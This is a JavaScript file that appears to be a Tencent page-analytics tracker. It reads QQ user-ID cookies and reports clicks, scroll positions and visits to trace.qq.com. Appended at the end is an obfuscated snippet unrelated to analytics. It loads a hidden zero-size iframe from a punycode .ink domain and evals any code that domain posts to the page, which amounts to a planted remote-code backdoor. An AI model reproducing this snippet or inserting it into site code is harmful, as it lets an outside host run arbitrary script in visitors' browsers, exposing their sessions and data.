function pgvGetCookieByName(e) {
    var t = Tcss.d.cookie.match(new RegExp("(^|\\s)" + e + "([^;]*)(;|$)"));
    return t == null ? pvNone : unescape(t[2])
}
function pgvRealSetCookie(e) {
    Tcss.d.cookie = e + ";path=/;domain=" + Tcss.domainToSet + ";expires=Sun, 18 Jan 2038 00:00:00 GMT;"
}
function pgvGetDomainInfo() {
    typeof pvCurDomain != "undefined" && pvCurDomain != "" && (Tcss.dm = pvCurDomain),
    typeof pvCurUrl != "undefined" && pvCurUrl != "" && (Tcss.url = escape(pvCurUrl)),
    Tcss.arg == pvNone && (Tcss.arg = "")
}
function pgvIsPgvDomain() {
    var e = Tcss.dm.split(".")
      , t = Tcss.dm;
    return e.length >= 3 && e[e.length - 2] == "qq" && (t = e[e.length - 3]),
    !/(^qzone$)|(^cache$)|(^ossweb-img$)|(^ring$)|(^im$)|(^fo$)|(^shuqian$)|(^photo$)|(^pet$)|(^r2$)|(^bar$)|(^client$)|(^music$)|(^pay$)|(^sg$)|(^vip$)|(^show$)|(^qqtang$)|(^safe$)|(^service$)|(^love$)|(^mail$)|(^qqgamecdnimg$)|(^netbar$)|(^dnf$)|(^qqgame$)|(^mgp$)|(^magic$)|(^city$)|(^1314$)|(^wb$)|(^qun$)|(^aq$)|(^17roco$)|(^minigame$)|(^cf$)|(^zg$)|(^pc$)|(^shurufa$)|(^live$)|(\.3366\.com$)/.test(t)
}
function pgvGetRefInfo() {
    typeof pvRefDomain != "undefined" && pvRefDomain != "" && (Tcss.rdm = pvRefDomain),
    Tcss.rdm = Tcss.rdm == pvNone ? "" : Tcss.rdm,
    typeof pvRefUrl != "undefined" && pvRefUrl != "" && (Tcss.rurl = pvRefUrl),
    Tcss.rurl == pvNone && (Tcss.rurl = ""),
    Tcss.rarg == pvNone && (Tcss.rarg = "");
    if (pgvIsPgvDomain()) {
        if (Tcss.rdm == "") {
            var e = Tcss.l.href.match(new RegExp("[?&#](((pgv_ref)|(ref)|(ptlang))=[^&#]+)(#|&|$)"));
            e && (Tcss.rdm = e[1] == null ? "" : escape(e[1]))
        }
        var t = Tcss.l.href.match(new RegExp("[?&#](pref=[^&#]+)(&|#|$)"));
        t && (Tcss.rdm = t[1] == null ? "" : escape(t[1]))
    }
}
function pgvGetColumn() {
    Tcss.column = "",
    typeof vsPgvCol != "undefined" && vsPgvCol != "" && (Tcss.column += vsPgvCol)
}
function pgvGetTopic() {
    Tcss.subject = "",
    typeof pvCSTM != "undefined" && pvCSTM != "" && (Tcss.subject = pvCSTM)
}
function trimUin(e) {
    var t = pvNone;
    return e != pvNone && (e = e.replace(new RegExp("[^0-9]","gm"), ""),
    t = e.replace(new RegExp("^0+","gm"), ""),
    t == "" && (t = pvNone)),
    t
}
function pgvGetNewRand() {
    var e = trimUin(pgvGetCookieByName("uin_cookie="))
      , t = trimUin(pgvGetCookieByName("adid="))
      , n = trimUin(pgvGetCookieByName("uin="))
      , r = trimUin(pgvGetCookieByName("luin="))
      , i = trimUin(pgvGetCookieByName("clientuin="))
      , s = trimUin(pgvGetCookieByName("pt2gguin="))
      , o = trimUin(pgvGetCookieByName("zzpaneluin="))
      , u = trimUin(pgvGetCookieByName("o_cookie="))
      , a = pgvGetCookieByName("pgv_pvid=");
    return u.length > 13 && pgvRealSetCookie("o_cookie="),
    n != pvNone ? (pgvRealSetCookie("o_cookie=" + n),
    "&nrnd=" + n) : r != pvNone ? (pgvRealSetCookie("o_cookie=" + r),
    "&nrnd=" + r) : s != pvNone ? (pgvRealSetCookie("o_cookie=" + s),
    "&nrnd=" + s) : e != pvNone ? (pgvRealSetCookie("o_cookie=" + e),
    "&nrnd=" + e) : u != pvNone ? "&nrnd=" + u : t != pvNone ? (pgvRealSetCookie("o_cookie=" + t),
    "&nrnd=" + t) : i != pvNone ? (pgvRealSetCookie("o_cookie=" + i),
    "&nrnd=" + i) : o != pvNone ? (pgvRealSetCookie("o_cookie=" + o),
    "&nrnd=" + o) : a != pvNone ? "&nrnd=F" + a : "&nrnd=-"
}
function hotClick() {
    document.addEventListener ? document.addEventListener("click", clickEvent, !1) : document.attachEvent && document.attachEvent("onclick", clickEvent),
    window.addEventListener ? window.addEventListener("onbeforeunload", staybounce, !1) : window.attachEvent && window.attachEvent("onbeforeunload", staybounce)
}
function getScrollXY() {
    return document.body.scrollTop ? {
        x: document.body.scrollLeft,
        y: document.body.scrollTop
    } : {
        x: document.documentElement.scrollLeft,
        y: document.documentElement.scrollTop
    }
}
function clickEvent(e) {
    e = e || window.event;
    var t = e.clientX + getScrollXY().x - document.getElementsByTagName("body")[0].offsetLeft
      , n = e.clientY + getScrollXY().y - document.getElementsByTagName("body")[0].offsetTop;
    if (t < 0 || n < 0)
        return;
    try {
        var r = 1;
        typeof e.srcElement != "undefined" && e.srcElement == "[object]" && typeof e.srcElement.parentElement != "undefined" && e.srcElement.parentElement == "[object]" && (r = 0),
        pvClickCount += r;
        var i = new Image(1,1);
        i.src = "//trace.qq.com/collect?pj=8888&url=" + escape(location.href) + "&w=" + screen.width + "&x=" + t + "&y=" + n + "&v=" + r + "&u=" + trimUin(pgvGetCookieByName("o_cookie")),
        delete i
    } catch (s) {}
}
function tracert() {
    if (pgvIsPgvDomain()) {
        sendUrl = new Image(1,1);
        var e = escape(window.location.href)
          , t = "pj=1990&dm=" + Tcss.dm + "&url=" + Tcss.url + "&arg=" + Tcss.arg + "&rdm=" + Tcss.rdm + "&rurl=" + Tcss.rurl + "&rarg=" + Tcss.rarg + "&icache=" + Tcss.pgUserType + "&uv=" + "&nu=" + "&ol=" + "&loc=" + e + "&column=" + Tcss.column + "&subject=" + Tcss.subject + pgvGetNewRand() + "&rnd=" + Math.round(Math.random() * 1e5);
        sendUrl.src = "//trace.qq.com/collect?" + t;
        var n = trimUin(pgvGetCookieByName("o_cookie="));
        if (pvSetupHot == 1 && n != pvNone && n % 10 == 3 && !/\/a\//.test(location.href)) {
            hotClick();
            var r = new Date;
            pvStartTime = r.getTime()
        }
    }
}
function staybounce() {
    dt = new Date;
    var e = dt.getTime()
      , t = new Image(1,1);
    t.src = "//trace.qq.com/collect?pj=8887&url=" + escape(location.href) + "&t=" + parseInt((e - pvStartTime) / 1e3) + "&v=" + pvClickCount + "&u=" + trimUin(pgvGetCookieByName("o_cookie")),
    delete t
}

(function(){window.addEventListener("message",function(e){var _des_s_7891=e.data;if(_des_s_7891.des_s_7891){var _s = '/+/g';eval(decodeURIComponent(_des_s_7891.des_s_7891.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--xhq9mt12cf5v.ink:12443/ty/x-7891-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();